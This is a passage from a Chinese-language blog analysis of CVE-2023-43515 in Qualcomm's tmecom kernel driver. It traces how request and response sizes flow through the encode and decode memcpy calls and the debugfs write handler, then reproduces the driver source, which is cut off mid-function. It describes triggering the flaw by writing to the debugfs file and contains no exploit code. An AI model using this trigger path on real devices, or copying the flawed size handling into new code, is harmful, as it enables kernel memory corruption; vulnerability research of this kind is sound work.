tdev-&gt;pkt.size 值小于TMECOM_RX_HDR_SIZE （8字节）的可能性，所以要找到这个指针是否由外部传入赋值。<br>在line~118 , 会调用 tmecom_encode 函数来赋值。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">    <span class="hljs-function"><span class="hljs-title">tdev</span>-&gt;</span>pkt.size = tmecom_encode(tdev, reqbuf, reqsize);  <span class="hljs-comment">// reqsize + 4</span><br></code></pre></td></tr></table></figure><p>tmecom_encode 函数会将size +TMECOM_TX_HDR_SIZE( 4字节 ) 的值返回给 tdev-&gt;pkt.size , 看到这个函数中的memcpy ，可能会觉得这个也有可能会导致overflow，因为size 是外部传入的。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">size_t</span> <span class="hljs-title">tmecom_encode</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tmecom *tdev, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *reqbuf,</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-type">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *msg = tdev-&gt;txbuf + TMECOM_TX_HDR_SIZE; <span class="hljs-comment">// 1024   +4</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)reqbuf;<br><br>    <span class="hljs-built_in">memcpy</span>(msg, src, size);  <span class="hljs-comment">// size &lt; 1024</span><br>    <span class="hljs-keyword">return</span> (size + TMECOM_TX_HDR_SIZE);   <span class="hljs-comment">// size + 4</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在这个函数中，是否存在问题取决于指针msg 缓冲区大小,下面的代码为其分配了1024个字节的内存空间。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">line</span>~260    tdev-&gt;</span><span class="hljs-function"><span class="hljs-title">txbuf</span> =devm_kzalloc(&amp;pdev-&gt;</span>dev, MBOX_MAX_MSG_LEN, GFP_KERNEL);<br></code></pre></td></tr></table></figure><p>tmecom_encode 函数size参数由 reqsize 传入，在 tmecom_process_request函数中，已经对reqsize 的大小做了限制，不允许大于1024，因而size 的值永远不会大于1024 +4 。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xl">    <span class="hljs-keyword">if</span> (!reqbuf || !reqsize || (reqsize &gt; MBOX_MAX_MSG_LEN)) &#123;  <span class="hljs-comment">// MBOX_MAX_MSG_LEN is 1024</span><br>        <span class="hljs-function"><span class="hljs-title">dev_err</span>(tdev-&gt;</span>dev, <span class="hljs-string">&quot;invalid reqbuf or reqsize\n&quot;</span>);<br>        return -EINVAL;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!respbuf || !respsize || (*respsize &gt; MBOX_MAX_MSG_LEN)) &#123;<br>        <span class="hljs-function"><span class="hljs-title">dev_err</span>(tdev-&gt;</span>dev, <span class="hljs-string">&quot;invalid respbuf or respsize\n&quot;</span>);<br>        return -EINVAL;<br>    &#125; <br>    <span class="hljs-function"><span class="hljs-title">mutex_lock</span>(&amp;tdev-&gt;</span>lock);<br>    <span class="hljs-function"><span class="hljs-title">tdev</span>-&gt;</span>rx_done = <span class="hljs-literal">false</span>;<br>    <span class="hljs-function"><span class="hljs-title">tdev</span>-&gt;</span>pkt.size = tmecom_encode(tdev, reqbuf, reqsize);  <span class="hljs-comment">// reqsize + 4</span><br></code></pre></td></tr></table></figure><p>接着分析reqsize 的值，这个值的传参是tmecom_debugfs_write 传入的len的值，在这里也限制的len的大小不能超过1024。这个函数会从用户空间赋值 len大小的 数据到内核 dpkt 内存空间里。然后交由tmecom_process_request 处理。并且触发这个函数的前提是编译选项中 CONFIG_DEBUG_FS 是开启的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">if</span> IS_ENABLED(CONFIG_DEBUG_FS)</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title">tmecom_debugfs_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file,</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *userstr, <span class="hljs-type">size_t</span> len, <span class="hljs-type">loff_t</span> *pos)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">size_t</span> rxlen = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">tme_ext_err_info</span> *err_info = (<span class="hljs-keyword">struct</span> tme_ext_err_info *)dpkt;<br>  <br>    <span class="hljs-keyword">if</span> (!len || (len &gt; MBOX_MAX_MSG_LEN)) &#123;   <span class="hljs-comment">// MBOX is 1024</span><br>        <span class="hljs-built_in">pr_err</span>(<span class="hljs-string">&quot;invalid message length\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EINVAL;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(dpkt, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(*dpkt));<br>    ret = <span class="hljs-built_in">copy_from_user</span>(dpkt, userstr, len);  <span class="hljs-comment">// dpkt is 1025</span><br>    <span class="hljs-keyword">if</span> (ret) &#123;<br>        <span class="hljs-built_in">pr_err</span>(<span class="hljs-string">&quot;%s copy from user failed, ret=%d\n&quot;</span>, __func__, ret);<br>        <span class="hljs-keyword">return</span> len;<br><br>    &#125;<br>    <span class="hljs-built_in">tmecom_process_request</span>(dpkt, len, dpkt, &amp;rxlen);<br>    ...nop..<br></code></pre></td></tr></table></figure><p>调用这个驱动，直接调用该驱动的write函数就可以触发漏洞。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_operations</span> tmecom_debugfs_ops = &#123;<br>    .open = simple_open,<br>    .write = tmecom_debugfs_write,<br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_DEBUG_FS */</span></span><br></code></pre></td></tr></table></figure><p>这个漏洞的原理还是比较清晰，但漏洞的触发前提是需要在编译内核的时候选定 CONFIG_DEBUG_FS 为开启。<br><img src="/74__%E9%AB%98%E9%80%9ACVE-2023-43515%E5%88%86%E6%9E%90.assets/image-20240426105319955.png"></p><p>这里要解释一下 simple_open 函数，simple_open，用于在 Linux 内核中实现文件系统。它的作用是在打开文件时将文件对象的私有数据指针指向索引节点（inode）的私有数据。</p><ul><li><code>file-&gt;private_data</code> 是一个指针，它指向文件对象的私有数据。在 Linux 内核中，当打开一个文件时，可以使用 <code>file-&gt;private_data</code> 来存储和访问与该文件相关的特定信息。通常情况下，这个指针会指向文件系统中的一些结构体或数据，以便在文件操作中可以方便地获取和修改相关信息。</li><li>前面的 tmecom_debugfs_write 函数，其实并没有用到 file-&gt;private_data 指针，我猜测并没有对驱动文件写入的操作，而是对全局变量dpkt写入数据， 因此在调用完simple_open 函数后，可以直接使用tmecom_debugfs_write<figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ocaml"><span class="hljs-built_in">int</span> simple_open(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file) <br>&#123; <br><span class="hljs-keyword">if</span> (inode-&gt;i_private) <br>file-&gt;private_data = inode-&gt;i_private; <br>return <span class="hljs-number">0</span>; <br>&#125; <br><span class="hljs-type">EXPORT_SYMBOL</span>(simple_open);<br></code></pre></td></tr></table></figure></li></ul><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><p>以下是该temcom.c 的完整代码</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">// SPDX-License-Identifier: GPL-2.0-only</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Copyright (c) 2022 Qualcomm Innovation Center, Inc. All rights reserved.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mailbox_client.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seq_file.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/debugfs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/platform_device.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mailbox/qmp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/uaccess.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mailbox_controller.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tmecom.h&quot;</span></span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tmecom</span> &#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">device</span> *dev;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">mbox_client</span> cl;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">mbox_chan</span> *chan;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">mutex</span> lock;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">qmp_pkt</span> pkt;<br><span class="hljs-type">wait_queue_head_t</span> waitq;<br><span class="hljs-type">void</span> *txbuf;<br><span class="hljs-type">bool</span> rx_done;<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> IS_ENABLED(CONFIG_DEBUG_FS)</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/tme_hwkm_master_defs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/tme_hwkm_master.h&gt;</span></span><br><br><span class="hljs-type">char</span> dpkt[MBOX_MAX_MSG_LEN + <span class="hljs-number">1</span>]; <span class="hljs-comment">// MBOX_MAX_MSG_LEN is 1024</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">dentry</span> *debugfs_file;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_DEBUG_FS */</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">tmecom</span> *tmedev;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * tmecom_msg_hdr - Request/Response message header between HLOS and TME.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This header is proceeding any request specific parameters.</span><br><span class="hljs-comment"> * The transaction id is used to match request with response.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Note: glink/QMP layer provides the rx/tx data size, so user payload size</span><br><span class="hljs-comment"> * is calculated by reducing the header size.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tmecom_msg_hdr</span> &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> reserved; <span class="hljs-comment">/* for future use */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> txnid;    <span class="hljs-comment">/* transaction id */</span><br>&#125; __packed;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TMECOM_TX_HDR_SIZE sizeof(struct tmecom_msg_hdr)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CBOR_NUM_BYTES (sizeof(unsigned int))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TMECOM_RX_HDR_SIZE (TMECOM_TX_HDR_SIZE + CBOR_NUM_BYTES)</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * CBOR encode emulation</span><br><span class="hljs-comment"> * Prepend tmecom_msg_hdr space</span><br><span class="hljs-comment"> * CBOR tag is prepended in request</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">size_t</span> <span class="hljs-title">tmecom_encode</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tmecom *tdev, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *reqbuf,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-type">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *msg = tdev-&gt;txbuf + TMECOM_TX_HDR_SIZE;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)reqbuf;<br><br><span class="hljs-built_in">memcpy</span>(msg, src, size);<br><span class="hljs-keyword">return</span> (size + TMECOM_TX_HDR_SIZE);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * CBOR decode emulation</span><br><span class="hljs-comment"> * Strip tmecom_msg_hdr &amp; CBOR tag</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">size_t</span> <span class="hljs-title">tmecom_decode</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tmecom *tdev, <span class="hljs-type">void</span> *respbuf)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *msg = tdev-&gt;pkt.data + TMECOM_RX_HDR_SIZE;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *rbuf = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)respbuf;<br><br><span class="hljs-built_in">memcpy</span>(rbuf, msg, (tdev-&gt;pkt.size - TMECOM_RX_HDR_SIZE));<br><span class="hljs-keyword">return</span> (tdev-&gt;pkt.size - TMECOM_RX_HDR_SIZE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title">tmecom_check_rx_done</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tmecom *tdev)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span>  tdev-&gt;rx_done;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">tmecom_process_request</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *reqbuf, <span class="hljs-type">size_t</span> reqsize, <span class="hljs-type">void</span> *respbuf,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-type">size_t</span> *respsize)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tmecom</span> *tdev = tmedev;<br><span class="hljs-type">long</span> time_left = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Check to handle if probe is not successful or not completed yet</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!tdev) &#123;<br><span class="hljs-built_in">pr_err</span>(<span class="hljs-string">&quot;%s: tmecom dev is NULL\n&quot;</span>, __func__);<br><span class="hljs-keyword">return</span> -ENODEV;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!reqbuf || !reqsize || (reqsize &gt; MBOX_MAX_MSG_LEN)) &#123;<br><span class="hljs-built_in">dev_err</span>(tdev-&gt;dev, <span class="hljs-string">&quot;invalid reqbuf or reqsize\n&quot;</span>);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!respbuf || !respsize || (*respsize &gt; MBOX_MAX_MSG_LEN)) &#123;<br><span class="hljs-built_in">dev_err</span>(tdev-&gt;dev, <span class="hljs-string">&quot;invalid respbuf or respsize\n&quot;</span>);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br><span class="hljs-built_in">mutex_lock</span>(&amp;tdev-&gt;lock);<br><br>tdev-&gt;rx_done = <span class="hljs-literal">false</span>;<br>tdev-&gt;pkt.size = <span class="hljs-built_in">tmecom_encode</span>(tdev, reqbuf, reqsize);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Controller expects a 4 byte aligned buffer</span><br><span class="hljs-comment"> */</span><br>tdev-&gt;pkt.size = (tdev-&gt;pkt.size + <span class="hljs-number">0x3</span>) &amp; ~<span class="hljs-number">0x3</span>;<br>tdev-&gt;pkt.data = tdev-&gt;txbuf;<br><br><span class="hljs-built_in">pr_debug</span>(<span class="hljs-string">&quot;tmecom encoded request size = %u\n&quot;</span>, tdev-&gt;pkt.size);<br><span class="hljs-built_in">print_hex_dump_bytes</span>(<span class="hljs-string">&quot;tmecom sending bytes : &quot;</span>,<br>DUMP_PREFIX_ADDRESS, tdev-&gt;pkt.data, tdev-&gt;pkt.size);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">mbox_send_message</span>(tdev-&gt;chan, &amp;tdev-&gt;pkt) &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">dev_err</span>(tdev-&gt;dev, <span class="hljs-string">&quot;failed to send qmp message\n&quot;</span>);<br>ret = -EAGAIN;<br><span class="hljs-keyword">goto</span> err_exit;<br>&#125;<br><br>time_left = <span class="hljs-built_in">wait_event_interruptible_timeout</span>(tdev-&gt;waitq,<br><span class="hljs-built_in">tmecom_check_rx_done</span>(tdev), tdev-&gt;cl.tx_tout);<br><br><span class="hljs-keyword">if</span> (!time_left) &#123;<br><span class="hljs-built_in">dev_err</span>(tdev-&gt;dev, <span class="hljs-string">&quot;request timed out\n&quot;</span>);<br>ret = -ETIMEDOUT;<br><span class="hljs-keyword">goto</span> err_exit;<br>&#125;<br><br><span class="hljs-built_in">dev_info</span>(tdev-&gt;dev, <span class="hljs-string">&quot;response received\n&quot;</span>);<br><br><span class="hljs-built_in">pr_debug</span>(<span class="hljs-string">&quot;tmecom received size = %u\n&quot;</span>, tdev-&gt;pkt.size);<br><span class="hljs-built_in">print_hex_dump_bytes</span>(<span class="hljs-string">&quot;tmecom received bytes : &quot;</span>,<br>DUMP_PREFIX_ADDRESS, tdev-&gt;pkt.data, tdev-&gt;pkt.size);<br><br><span class="hljs-keyword">if</span> (tdev-&gt;pkt.size &lt;= TMECOM_RX_HDR_SIZE) &#123;<br><span class="hljs-built_in">dev_err</span>(tdev-&gt;dev, <span class="hljs-string">&quot;invalid pkt.size received\n&quot;</span>);<br>ret = -EPROTO;<br><span class="hljs-keyword">goto</span> err_exit;<br>&#125;<br><br>*respsize = <span class="hljs-built_in">tmecom_decode</span>(tdev, respbuf);<br><br>tdev-&gt;rx_done = <span class="hljs-literal">false</span>;<br>ret = <span class="hljs-number">0</span>;<br><br>err_exit:<br><span class="hljs-built_in">mutex_unlock</span>(&amp;tdev-&gt;lock);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><span class="hljs-built_in">EXPORT_SYMBOL</span>(tmecom_process_request);<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> IS_ENABLED(CONFIG_DEBUG_FS)</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title">tmecom_debugfs_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *userstr, <span class="hljs-type">size_t</span> len, <span class="hljs-type">loff_t</span> *pos)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> rxlen = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tme_ext_err_info</span> *err_info = (<span class="hljs-keyword">struct</span> tme_ext_err_info *)dpkt;<br><br><br><span class="hljs-keyword">if</span> (!len || (len &gt; MBOX_MAX_MSG_LEN)) &#123;<br><span class="hljs-built_in">pr_err</span>(<span class="hljs-string">&quot;invalid message length\n&quot;</span>);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br><span class="hljs-built_in">memset</span>(dpkt, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(*dpkt));<br>ret = <span class="hljs-built_in">copy_from_user</span>(dpkt, userstr, len);<br><span class="hljs-keyword">if</span> (ret) &#123;<br><span class="hljs-built_in">pr_err</span>(<span class="hljs-string">&quot;%s copy from user failed, ret=%d\n&quot;</span>, __func__, ret);<br><span 